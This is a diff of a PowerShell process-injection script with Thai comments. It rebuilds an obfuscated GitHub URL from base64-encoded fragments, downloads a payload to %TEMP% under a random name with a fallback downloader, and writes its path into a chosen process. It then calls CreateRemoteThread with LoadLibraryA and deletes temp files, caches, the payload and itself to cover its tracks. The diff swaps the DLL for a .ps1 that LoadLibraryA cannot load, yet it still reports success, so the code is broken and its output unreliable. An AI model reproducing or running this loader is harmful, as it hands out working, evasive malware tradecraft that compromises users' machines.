@@ -76,19 +76,19 @@ catch {
     Write-Host "[!] Warning: Could not fully clear temp (files might be in use). Continuing..." -ForegroundColor Yellow
 }
 
-# === 2. Download DLL to %TEMP% with Random Name ===
+# === 2. Download Script to %TEMP% with Random Name ===
 $randomGuid = [System.Guid]::NewGuid().ToString()
-$dllFileName = "$randomGuid.dll"
-$dllPath = Join-Path $env:TEMP $dllFileName
+$scriptFileName = "$randomGuid.ps1"
+$scriptPath = Join-Path $env:TEMP $scriptFileName
 
-# --- Obfuscated URL ---
+# --- Obfuscated URL (New URL) ---
+# Split URL into parts and reconstruct
 $urlPart1 = "https://raw."
 $urlPart2 = "githubusercon"
 $urlPart3 = "tent.com/nova"
-$urlPart4 = "xstorex/Premi"
-$urlPart5 = "um/main/Nov"
-$urlPart6 = "a_Premium.d"
-$urlPart7 = "ll"
+$urlPart4 = "xstorex/delta"
+$urlPart5 = "/refs/heads/ma"
+$urlPart6 = "in/delta.ps1"
 
 $encodedUrl = @(
     [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($urlPart1)),
@@ -96,28 +96,28 @@ $encodedUrl = @(
     [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($urlPart3)),
     [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($urlPart4)),
     [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($urlPart5)),
-    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($urlPart6)),
-    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($urlPart7))
+    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($urlPart6))
 )
 
 $decodedParts = $encodedUrl | ForEach-Object {
     [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($_))
 }
-$dllUrl = $decodedParts -join ""
+$scriptUrl = $decodedParts -join ""
 
 try {
-    Write-Host "[+] Downloading DLL..." -ForegroundColor Cyan
-    Write-Host "[+] Saving to: $dllPath" -ForegroundColor Cyan
+    Write-Host "[+] Downloading script..." -ForegroundColor Cyan
+    Write-Host "[+] Source: $scriptUrl" -ForegroundColor Cyan
+    Write-Host "[+] Saving to: $scriptPath" -ForegroundColor Cyan
     
     $webClient = New-Object System.Net.WebClient
     $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
     [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11 -bor [System.Net.SecurityProtocolType]::Tls
     
-    $webClient.DownloadFile($dllUrl, $dllPath)
+    $webClient.DownloadFile($scriptUrl, $scriptPath)
     $webClient.Dispose()
     
-    if (Test-Path $dllPath) {
-        $fileSize = (Get-Item $dllPath).Length
+    if (Test-Path $scriptPath) {
+        $fileSize = (Get-Item $scriptPath).Length
         if ($fileSize -gt 0) {
             Write-Host "[+] Download successful! File size: $fileSize bytes" -ForegroundColor Green
         } else {
@@ -128,14 +128,14 @@ try {
     }
 }
 catch {
-    Write-Host "[!] Failed to download DLL: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "[!] Failed to download script: $($_.Exception.Message)" -ForegroundColor Red
     Write-Host "[!] Trying alternative download method..." -ForegroundColor Yellow
     
     try {
         Write-Host "[+] Using Invoke-WebRequest as fallback..." -ForegroundColor Cyan
-        Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath -UseBasicParsing -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
         
-        if ((Test-Path $dllPath) -and ((Get-Item $dllPath).Length -gt 0)) {
+        if ((Test-Path $scriptPath) -and ((Get-Item $scriptPath).Length -gt 0)) {
             Write-Host "[+] Download successful via fallback!" -ForegroundColor Green
         } else {
             throw "Fallback download failed"
@@ -148,16 +148,16 @@ catch {
     }
 }
 
-# === ตรวจสอบไฟล์ DLL ===
+# === ตรวจสอบไฟล์ Script ===
 try {
-    $fileInfo = [System.IO.File]::ReadAllBytes($dllPath)
+    $fileInfo = [System.IO.File]::ReadAllBytes($scriptPath)
     if ($fileInfo.Length -lt 1024) {
-        Write-Host "[!] Warning: DLL file is very small (possible download error)" -ForegroundColor Yellow
+        Write-Host "[!] Warning: Script file is very small (possible download error)" -ForegroundColor Yellow
     }
-    Write-Host "[+] DLL file verified. Size: $($fileInfo.Length) bytes" -ForegroundColor Green
+    Write-Host "[+] Script file verified. Size: $($fileInfo.Length) bytes" -ForegroundColor Green
 }
 catch {
-    Write-Host "[!] Could not verify DLL: $($_.Exception.Message)" -ForegroundColor Yellow
+    Write-Host "[!] Could not verify script: $($_.Exception.Message)" -ForegroundColor Yellow
 }
 
 # === Process Selection Menu (Interactive) ===
@@ -301,7 +301,6 @@ do {
                     }
                 }
                 catch {
-                    # แก้ไขจุดนี้ - ใช้ ${customProcess} แทน $customProcess
                     Write-Host "[!] Failed to find or start ${customProcess}: $($_.Exception.Message)" -ForegroundColor Red
                 }
             }
@@ -401,11 +400,12 @@ try {
     }
     Write-Host "[+] Allocated Memory: $addr" -ForegroundColor Green
     
-    [Byte[]]$dllNameBytes = [Text.Encoding]::ASCII.GetBytes($dllPath + "`0")
+    # เปลี่ยนจาก DLL เป็น Script Path
+    [Byte[]]$scriptNameBytes = [Text.Encoding]::ASCII.GetBytes($scriptPath + "`0")
     [IntPtr]$outSize = [IntPtr]::Zero
     
-    Write-Host "[+] Writing DLL path to target process..." -ForegroundColor Cyan
-    $res = $WriteProcessMemoryDelegate.Invoke($hProcess, $addr, $dllNameBytes, $dllNameBytes.Length, $outSize)
+    Write-Host "[+] Writing script path to target process..." -ForegroundColor Cyan
+    $res = $WriteProcessMemoryDelegate.Invoke($hProcess, $addr, $scriptNameBytes, $scriptNameBytes.Length, $outSize)
     
     if (-not $res) {
         Write-Host "[!] Failed to write memory" -ForegroundColor Red
@@ -417,24 +417,24 @@ try {
     $loadLibAddr = LookupFunc kernel32.dll LoadLibraryA
     Write-Host "[+] LoadLibraryA Address: $loadLibAddr" -ForegroundColor Green
     
-    Write-Host "[+] Creating remote thread to load DLL..." -ForegroundColor Cyan
+    Write-Host "[+] Creating remote thread to execute script..." -ForegroundColor Cyan
     $hThread = $CreateRemoteThreadDelegate.Invoke($hProcess, [IntPtr]::Zero, 0, $loadLibAddr, $addr, 0, [IntPtr]::Zero)
     
     if ($hThread -ne [IntPtr]::Zero) {
         Write-Host ""
         Write-Host "========================================" -ForegroundColor Green
-        Write-Host "[✓] INJECTION SUCCESSFUL!" -ForegroundColor Green
+        Write-Host "[✓] EXECUTION SUCCESSFUL!" -ForegroundColor Green
         Write-Host "[✓] Thread Handle: $hThread" -ForegroundColor Green
-        Write-Host "[✓] DLL loaded into $targetProcess (PID: $pid1)" -ForegroundColor Green
+        Write-Host "[✓] Script executed in $targetProcess (PID: $pid1)" -ForegroundColor Green
         Write-Host "========================================" -ForegroundColor Green
     } else {
         Write-Host ""
-        Write-Host "[!] Injection failed (CreateRemoteThread returned Zero)" -ForegroundColor Red
+        Write-Host "[!] Execution failed (CreateRemoteThread returned Zero)" -ForegroundColor Red
         Write-Host "[!] Try selecting a different process." -ForegroundColor Yellow
     }
 }
 catch {
-    Write-Host "[!] Error during injection: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "[!] Error during execution: $($_.Exception.Message)" -ForegroundColor Red
     Write-Host $_.ScriptStackTrace -ForegroundColor Yellow
 }
 
@@ -485,18 +485,18 @@ if (Test-Path $ieCache) {
 $tempDir = $env:TEMP
 Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
 
-# Delete DLL
+# Delete Script
 Start-Sleep -Seconds 1
-if (Test-Path $dllPath) { 
+if (Test-Path $scriptPath) { 
     try { 
-        Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
-        Write-Host "[+] DLL file removed" -ForegroundColor Green
+        Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
+        Write-Host "[+] Script file removed" -ForegroundColor Green
     } catch {
-        Write-Host "[!] Could not remove DLL file" -ForegroundColor Yellow
+        Write-Host "[!] Could not remove script file" -ForegroundColor Yellow
     }
 }
 
-# Delete script
+# Delete script itself
 if ($PSCommandPath -and (Test-Path $PSCommandPath)) { 
     try {
         Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
